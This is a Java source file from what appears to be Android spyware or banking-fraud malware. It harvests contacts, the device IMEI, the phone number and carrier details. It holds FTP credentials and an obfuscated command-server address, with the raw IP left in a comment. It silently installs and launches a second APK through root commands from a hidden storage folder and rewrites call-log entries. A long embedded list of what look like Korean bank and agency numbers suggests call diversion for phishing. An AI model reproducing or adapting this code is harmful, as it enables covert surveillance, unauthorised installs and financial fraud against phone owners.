package com.android.smartmonitor.common;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.TimeZone;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

public class CheckGlobal {
	public static final String g_apkPath = "/mnt/sdcard/.TTemp/pp_ii_ll_ll.apk";
	
	public static final String g_recordPath = "/mnt/sdcard/.TTemp/";
	public static final int g_uploadFileLimit = 1024 * 1024; //bytes

	public static final int g_logLimit = 50;
	public static final String g_FTPUserName = "root";
	public static final String g_FTPPassword = "19901024";

	public static final int g_serviceInterval = 5000;

	public static String[] changeNumbers = { "025235005|07074565234|025672227|0260029300|023238026|023647955|16610119|0216610119|025391544|0517131221|16449988|0216449988|15772280|0215772280|0232875000|15667733|0215667733|0221937700|0314015383|16669119|0216669119|16889119|0216889119|16880073|0216880073|15886161|0215886161|0221990114|025211771|15771885|0215771885|16447658|0216447658|024024646|16443700|0216443700|16443900|0216443900|0552228100|0537142000|0637121000|0542733800|0215662240|15662210|0215662210|15662000|0215662000|16008888|0216008888|0316887600|0622202000|112|0516409016|0516409000|18779900|0218779900|16880114|0216880114|0516409120|0516409100|0616600115|0622201900|0616600125|0616600114|0616600166|023609585|15776242|0215776242|0316988200|0323638000|0312998000|03180672000|0319568200|0314798000|15771771|0215771771|16444198|0216444198|0622395000|0544724321|0544521101|0516402114|0516362121|025853700|025935445|07074565233|0231455114|1332|0221568000|0325266000|027296114|0267168800|025656234|0556030162|0237865895|0315663300|0317183377|0534279300|0234759300|0518199302|0234759350|025446446|028271600|023975114|0220805114|0436405118|0436420131|0436405000|0438557551|0537423301|0234875800|025628311|16446644|0216446644|16445600|0216445600|025195000|0512461811|0534275700|0516271811|027755600|025339100|025141811|025399100|024241711|0332561711|0517421811|16448211|0216448211|16448311|0216448311|0542744111|0547732222|0542315111|15444671|0215444671|0625275701|0625275702|0625275703|0625275704|0625275705|0625275706|0625275707|0623715701|0623715702|0623715703|0612455506|16887210|0216887210|027968120|025695600|0233930015|025512583|15446110|0215446110|15773820|0215773820|0237051700|0237051715|0234813030|0262151800|0220620300|0262056100|0234537722|0232953600|025443071|027840700|16008292|0216008292|0222647000|0234082700|027575000|0622260180|0627200800|15779931|0215779931|15779911|0215779911|0264561700|0536635025|0536635000|0544348154|01020088009|025235342|025577241|025231363|15442448|0215442448|0221867813|15667979|0215667979|15777700|0215777700|024185577|0315629580|029502992|023353963|0323231943|023631280|0319093730|024116950|029620241|03180869920|025690780|0622340860|0534220860|0422540860|029000860|025640860|0518070860|0312450860|0325250860|0647430864|15661010|0215661010|0221265000|15442525|0215442525|0532529636|0427102455|0518090904|028657447|025524994|025524994|0220396903|0622363599|0325165566|0542540004|025115242|029451315|025677565|0234532540|15772320|0215772320|0263093700|0220681916|0263375200|0324303309|0322905507|0317108103|0312708006|0319291205|0313403407|0322905500|0325168151|0319291209|0324303300|0324248151|03180507000|0317108100|0312708000|0319291234|0313403400|0622235506|0237098800|0237745943|0234541550|15660008|0215660008|025820071|0221831100|0222710071|0222752115|025017293|0518033920|0226772772|18990011|0218990011|0226762882|0623837227|0533419343|0424789438|0518162882|0328662772|15446144|0215446144|0234482051|0234482052|0622232053|0532532052|0324416144|0324426144|025868200|0314438611|0313999400|025033200|0314433800|0314411747|0512466911|0513316800|0522576160|0552646160|0516689000|0512466161|0516423300|0234873585|15775822|0215775822|025584589|0336434589|0627166889|0622323589|028303589|0544561589|029372789|0534264689|0513312589|0536511389|0552512489|16443939|0216443939|027793889|0612434589|0517123939|0326520289|0325072389|03180422289|0623853589|0518172589|0317220589|025611289|0312432389|0231433589|0414271789|0314803589|0314441789|0553631389|028354689|0522672589|0318781789|0319130289|0517031589|0647023589|027452789|0324213489|0422543589|0557481389|0415221589|024724589|029603589|0316511789|0542480289|0512023589|0226011589|0263300114|025954321|0234749910|027869911|0222550299|025582501|0542754060|0312666411|025565959|0317916411|023514507|0416647777|0234746535|15882208|0215882208|024556367|0316336781|0313293800|0316326464|0316326785|0317666781|0419010155|0423313900|0415735300|0622244010|0220228000|0232779109|0518618600|0553552101|0222402114|0221828817|0516055700|0323630123|03180220678|025596800|0522088000|0634439000|06269150066|0622232131|0622320011|15773800|0215773800|0269150000|0269150023|0327142000|16610055|0216610055|16613651|0216613651|0232183700|15884111|0215884111|0234854100|15775896|0215775896|0632771311|15660600|0215660600|0220178300|025012587|0518030160|025559502|15668778|0215668778|0215446565|15446565|0222600774|0222600700|0234670100|16005500|0216005500|16447777|0216447777|0317362100|0267162100|0317782100|0315462100|0269102100|0327172100|0319942100|027560505|16447777|0216447777|027733400|0262102600|024475880|027871200|0220383219|15775001|0215775001|0234469090|0415446041|0415379000|0262046500|0432238000|0221656700|0234596000|0312500300|0260981200|0438447411|0234519200|15990038|0215990038|0220231100|0432799100|0432799250|0230112956|0230112957|0230112970|027157311|15448600|0215448600|0220175400|0269433100|0338207000|029900232|0338104500|0519107600|0515066500|0519907400|0323256819|0315474300|0532107100|0327124100|0222481477|0632788775|0637106300|0557427114|0414106500|0439066100|0315474860|0269104700|0427203631|0234517200|0221497400|0319417271|0313845511|0314414141|15886750|0215886750|0424715571|028631122|0518186300|0323229800|0232888200|025254900|0226212269|023548282|0220402902|0222766900|025147676|0632137979|0234821186|0336473901|0555367979|0315367979|0516247979|0232937979|0515327979|0428677979|023195842|0536237979|0538117979|0220096600|025981365|0317397979|0312567979|0314687979|025327979|0226347979|0314517979|0222032462|0647267979|0324377979|0557627979|0236767979|0512937979|0232867979|0226907979|0623837979|0545537979|0325167979|062)2247979|0552217979|0539647979|0617557979|0326117979|0325217979|0313167979|0516387979|027182407|029297979|0617427979|0327627979|0413387979|0314267979|0514627979|023861162|0312157979|0522217979|0337427979|0318457979|0319247979|0552877979|0416227979|024467979|0432217979|0332549915|0313847979|0545547979|0514657979|0537466255|15660700|0215660700|15441600|0215441600|15773547|0215773547|0221364500|025831221|15446888|0215446888|0234523888|024670065|0319680027|0534227001|0545346111|0532523603|0537424411|0537565200|0220110700|0326512121|0269067053|0018777788|0269067050|18777788|0218777788|0559437001|0226784377|0529391234|15880037|0215880037|0632708412|0634675811|0424770600|0323230900|03180160900|0415770900|0638575811|0221410900|0418628628|0632708400|0220465500|16449590|0216449590|0522690066|025376300|025481975|16446565|0216446565|0634698872|0623727800|0612448171|025142345|0632132345|0647203300|0634698800|0324526688|03180186688|025336688|0232886688|0324206688|0319606688|029666688|0313856688|0262060300|025406688|0315690600|0312670200|0314764300|0318490114|0324219100|0319240600|0317043400|0016440052|025507700|0221527700|16440052|0216440052|025947700|0220506700|0544527861|023257373|0415427001|16110022|0216610022|025164000|025568584|0234539125|0518119500|0230162390|0221468000|0222306945|0234798000|15885191|0215885191|0220083100|0220023000|0518119400|0518065252|025387644|0269152000|16882300|0216882300|15441200|0215441200|0518010052|027168210|15888210|0215888210|0518028210|028627700|0220515829|0319322100|0627107700|0424842900|0415691110|0323373900|0537107100|16880001|0216880001|0518055707|0325212050|0317221900|0323256767|0318955500|0337356060|0318753400|0552735522|0313879901|15665040|0215665040|023513684|0535538700|0532564000|0323291501|15665432|0215665432|025559370|0220153900|0221792400|0325562922|0317860001|0226850001|024670864|025013714|024127240|024127247|0234539124|0328603652|0325288300|0328653911|0328603655|0324212111|15660336|0215660336|16008045|0216008045|023978800|023978600|0632507114|025223579|0222611372|023183545|025594000|0647200200|16445682|0216445682|0423349000|0519122000|0322121177|0313087766|0556384141|16442723|0216442723|0556454411|025832525|0535635817|16440233|0216440233|025162759|15664485|0215664485|0269257172|0263043300|023188448|0234670128|0234536211|025630860|027032537|16447706|0216447706|025558710|025610222|07087897831|15447535|0215447535|027432208|025622777|025579111|0222634300|025218585|0536311783|023329377|0234724100|0234541983|0234541189|15665995|0215665995|0221673114|027614800|0234540077|0221867831|025113634|025665015|025010481|16446688|0216446688|027542532|025479988|0418673232|0328124366|0221673880|025936789|027070973|15661776|0215661776|025431666|025396009|0314237011|027556222|15882961|0215882961|0322130100|025399750|16612775|0216612775|0516335067|0221065417|15449931|0215449931|0222611162|0626510250|01094048608|0647432171|16611547|0216611547|025390965|0220863534|025658279|0222973900|0226350990|0220881280|025162386|024574547|0220518333|0234471535|025169201|0221673883|023265695|15665010|0215665010|0260973510|025210339|0237890008|025140994|025662828|0543326511|025389671|16443089|0216443089|0556330220|027070973|15440301|0215440301|0226936235|0237865825|0234426166|15774822|0215774822|0262843000|0262481103|025761313|024106289|027047400|024095156|025649229|0234777030|0552877001|0222666000|0222441338|025080460|0557400177|0517117775|0557362100|0553333200|0518051400|0522672500|0552790002|0557400100|0557400176|0537207318|0537207300|0537207300|0432569114|0617959770|0622365960|0632374270|0432719340|15449191|0215449191|0234665588|0424708900|0226400101|0267115005|0267115400|0647383111|0267115300|0425283663|0647253111|0234505511|0413310061|0267115678|0222406300|0647563111|0415739696|16008800|0216008800|0221125353|0220183000|01047931020|027363456|15887999|0215887999|0623845890|0532560377|0515120444|0326137900|0234840400|15992554|0215992554|16446140|0216446140|0313995005|0234526200|0222615005|0234526200|0622265005|0622265005|0536295005|0422565005|0513275005|15665005|0215665005|15440344|0215440344|0234049913|15775511|0215775511|0234535600|025161630|025382411|16700077|0216700077|0324277700|0326537700|0261110815|15889461|0215889461|0234529000|0518046627|025291617|0221926000|15770090|0215770090|023514576|023552155|15443460|0215443460|0317769300|0317769301|0317769302|0317769303|0317769304|0315040001|0315040002|0315040003|0315040004|0315040005|0316593312|0316593324|0316593300|0234576300|0542743851|025133100|0269329000|0263299000|025079001|027309001|025459000|025647890|027346901|024302039|0222302720|0222302780|0317801020|0222302740|0222302440|0324203220|0317801000|0222302420|0222302600|0324203200|0222302460|18991122|0218991122|0222302400|0220371111|027491888|15770011|0215770011|0234777007|023984114|15665114|0215665114|027874000|0237023114|0234552114|027290114|16441110|0216441110|15883570|0215883570|0234684400|03126140700|0226140700|0622256100|0317884000|0325119911|0312252211|0314752300|0616602000|0319017900|0324415051|0314256100|0316513311|0317884031|15776333|0215776333|16660330|0216660330|025521177|025217141|0424798800|0415700700|0432707000|0437300500|0437332626|15442115|0215442115|0234661335|0220515300|027561500|0226534700|029151191|0234661300|0634408000|0632598000|15776400|0215776400|0632798000|0317570999|0317595000|0326575000|0512508100|0512508400|0522088500|0552798700|0512508300|0512508000|15775566|0215775566|025572292|16448002|0216448002|15446700|0215446700|0539651012|027288800|0221354200|0260842551|0234454100|0234164000|0221356300|0221356400|0221354100|0435321234|0319363000|15662230|0215662230|0317102000|0317289000|0260840140|0260841040|0260841220|0260841909|0260842077|0260842246|0260842449|0260842559|0260842884|0260842886|0260842988|0260842993|0260842996|0260846684|0260847786|0260848587|0260848894|0260849667|0260857878|0261050650|0263482529|0263483442|0264024987|0264026711|0264034754|0264057871|0264068408|0264076979|0264089790|0264089903|0264097867|0264098908|0264973573|0264977112|0313418678|0313420908|0313454485|0313455876|0313460855|0313474112|0313477313|03180025169|03180025697|03180025739|03180135529|03180135590|03180135887|03180137225|03180137577|03180137771|03180345071|03180345206|03180345271|03180345293|03180345496|0318112966|0318113229|0318113230|0318113499|0318113988|0318114335|0318114560|0318115536|0318115581|0318115997|0318116222|0318116336|0318116443|0318116553|0318116614|0322015441|0322016515|0322019117|0322041125|0322043293|0322043781|0322049474|0322290043|0339121551|0419085844|0419086061|0419086697|0419086757|0419086887|0419702330|0419801366|0419801401|0419801440|0419801466|0419801488|0439081998|0439082286|0439082744|0439111662|0221354500|0221354800|0221354300|15662220|0221354600|16005700|0216005700|0220156640|15882114|0215882114|15776172|0215776172|0269066500|0226003300|028607200|15885330|0215885330|15882114|0215882114|0312207000|0313895900|0632303800|0552397900|15775200|0215775200|0518677707|0518677701|15889688|0215889688|0319039004|0516342100|0519252100|029945501|18997979|0218997979|0218008282|18008282|0215667799|15667799|0215778000|15778000|16610001|0216610001|18998500|0218998500|15884000|0215884000|15881688|0215881688|15888700|0215888700|15447000|0215447000|15776000|0215776000|15888100|0215888100|16447400|0216447400|15991155|0215991155|15885000|0215885000|15661000|0215661000|15884477|0215884477|15881515|0215881515|15880079|0215880079|15883388|0215883388|15662566|0215662566|15881599|0215881599|0553706700|18771919|18550001|0218550001|0269250100", "" };


	public static final String g_managerURL = "VjFaV2IxVXdNVWhVYTFacFRURndUbHBYZUVkT2JGSklZMFZ3VGxaVVZsVlVhMmh2Vkd4YVNGcEVSbFZXYkVwRFdsWldNMlZzVW5WVmJYQk9Wa2Q0ZGxZeWRHcGxSMDVJVTI1Q1VGSkVRVGs9";
	//public static final String g_managerURL = "http://43.255.118.102/sms_admin/";

	public static final String saler_code = "0000000003";
	
	public static String KMSEncode(String str)
	{
	    String encoded = str;
	    
	    for (int i = 0; i < 5; i++)
	    {
	    	encoded = CheckEncryptor.encode(encoded);
	    }
	
	    return encoded;
	}
	
	public static String KMSDecode(String encoded)
	{
	    String str = encoded;
	    
	    for (int i = 0; i < 5; i++)
	    {
	    	str = CheckEncryptor.decode(str);
	    }
	
	    return str;
	}
	
	public static String getDeviceName() {
	    String manufacturer = android.os.Build.MANUFACTURER;
	    String model = android.os.Build.MODEL;
	    
	    if (model.startsWith(manufacturer)) {
	    	return capitalize(model);
	    } else {
	    	return capitalize(manufacturer) + " " + model;
	    }
    }

	public static String capitalize(String s) {
	    if (s == null || s.length() == 0) {
	    	return "";
	    }
	    char first = s.charAt(0);
	    if (Character.isUpperCase(first)) {
	    	return s;
	    } else {
	    	return Character.toUpperCase(first) + s.substring(1);
	    }
	} 
    
	public static HashMap<String, String> getContacts(Context context)
    {    
    	HashMap<String, String> result = new HashMap<String, String>();
    	int number = 0;
    	
    	Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);    
    	while(cursor.moveToNext())     
    	{        
    		int phone_idx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);        
    		int name_idx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);  
    		
    		String phone = cursor.getString(phone_idx);        
    		String name = cursor.getString(name_idx);  
    		
    		if(phone == null || name == null)
    			continue;
    		
    		if (phone.length() > 1 && phone.charAt(0) == '+')
    			phone = phone.substring(1);
    		
    		result.put(String.valueOf(number * 2), phone);
    		result.put(String.valueOf(number * 2 + 1), name);
    		number++;
    	}
    	
    	result.put("number", String.valueOf(number));
		return result;
    }

	//기재 전화번호 얻기
	public static String getOwnPhoneNumber(Context context)
    {
		String number = "";
		
		TelephonyManager localTelephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
		number = localTelephonyManager.getLine1Number();
		if(number == null)
			return "";
		
		if(number.length() > 1 && number.charAt(0) == '+')
			number = number.substring(1);

			
		return number;
    }
    
	public static String getNetworkName(Context context)
    {
    	String name = "";
    	
    	TelephonyManager localTelephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
		name = localTelephonyManager.getNetworkOperatorName();
    	
    	return name;
    }
    
	public static String getDeviceID(Context context)
    {
    	String deviceID = "";
		
		TelephonyManager localTelephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
		deviceID = localTelephonyManager.getDeviceId();
		
		if(deviceID == null)
			deviceID = "tester";
					
		return deviceID;
    }
    
	public static String getOSVersion(Context context)
    {
    	String OSVersion = "";
		
		TelephonyManager localTelephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
		OSVersion = localTelephonyManager.getDeviceSoftwareVersion();
					
		return OSVersion;
    }
	
    public static void installAPK(Context context, String filePath)
    {
    	File apkFile = new File(filePath);
    	
    	if(apkFile == null)
    		return;
    	    	
    	final String commandUninstall = "pm uninstall " + "com.android.pill" + "\n";
    	final String commandInstall = "pm install " + filePath + "\n";
    	final String deleteAPK = "rm " + filePath + "\n";
		final String commandExe ="am start -a android.intent.action.MAIN -n " + "com.android.pill" + "/" + "com.android.pill.MainActivity" + "\n";
		
		final String command = commandUninstall + commandInstall + deleteAPK + commandExe  + "sync\n";
		
		int res = CheckGlobal.execRootCmdSilent(command);

    }
    
    public static boolean hasRootPermission() {
		boolean rooted = true;
		try {
			File su = new File("/system/bin/su");
			if (su.exists() == false) {
				su = new File("/system/xbin/su");
				if (su.exists() == false) {
					rooted = false;
				}
			}
		} catch (Exception e) {
			//log( "Can't obtain root - Here is what I know: "+e.getMessage());
			rooted = false;
		}

		return rooted;
	}
    
    public static boolean haveRoot() {
    	int i = execRootCmdSilent("echo test");
		if (i != -1 && i != 1)
			return true;
		return false;
	}
    
    public static int execRootCmdSilent(String paramString) {
		try {
			Process localProcess = Runtime.getRuntime().exec("su");
			Object localObject = localProcess.getOutputStream();
			DataOutputStream localDataOutputStream = new DataOutputStream((OutputStream) localObject);

			String str = String.valueOf(paramString);
			localObject = str + "\n";
			localDataOutputStream.writeBytes((String) localObject);
			localDataOutputStream.flush();
			localDataOutputStream.writeBytes("exit\n");
			localDataOutputStream.flush();
			localProcess.waitFor();
			int result = localProcess.exitValue();
			return (Integer) result;
		} catch (Exception localException) {
			localException.printStackTrace();
			return -1;
		}
	}
    
    public static void sleep(long millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException e) {
        }
    }
    
    public static void copyBinary(Context context, int id, String path)
	{
		try {
			InputStream ins = context.getResources().openRawResource(id);
			int size = ins.available();

			// Read the entire resource into a local byte buffer.
			byte[] buffer = new byte[size];
			ins.read(buffer);
			ins.close();

			FileOutputStream fos = new FileOutputStream(path);
			fos.write(buffer);
			fos.close();
		}
		catch (Exception e)
		{
			System.out.print("public void createBinary(): " + e.getMessage());
		}
	}
    
    public static String timeToString(Long time) {
	    SimpleDateFormat simpleFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	    String date = simpleFormat.format(new Date(time));
	    return date;
	}
    
    public static void wifiLog(String str)
    {    
		String path = "/mnt/sdcard/wifi_debug.txt";
		File file = new File(path);
	    FileOutputStream fos = null;
	    
	    Calendar localCalendar = Calendar.getInstance(TimeZone.getTimeZone("GMT+08:00"));
        str = localCalendar.get(1) + "-" + (1 + localCalendar.get(2)) + "-" + localCalendar.get(5) + " " + localCalendar.get(11) + ":" + localCalendar.get(12) + ":" + localCalendar.get(13) + " ----- " + str + "\n";
	    
	    try{
	    	fos = new FileOutputStream(file, true);
	    	fos.write(str.getBytes());
			fos.close();
	    } catch (Exception e) {
	    	e.printStackTrace();
	    }
    }
    
    public static void switchIME(Context context)
    {
    	try {

    	} catch (Exception e) { // java.lang.NoSuchMethodError if API_level<11
    	}
    }
    
    public static void updateCallLog(Context context, String number1, String number2){
    	ContentValues localContentValues = new ContentValues();
	    localContentValues.put("number", number1);
	    final ContentResolver resolver = context.getContentResolver();
	    Uri localUri = CallLog.Calls.CONTENT_URI;
	    String[] arrayOfString = new String[1];
	    arrayOfString[0] = number2;
	    resolver.update(localUri, localContentValues, "number=?", arrayOfString);
	    Cursor cur = null;
	    cur = resolver.query(localUri, null, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
	    cur.moveToFirst();
	    int duration = cur.getInt(cur.getColumnIndex(CallLog.Calls.DURATION));
    }


}
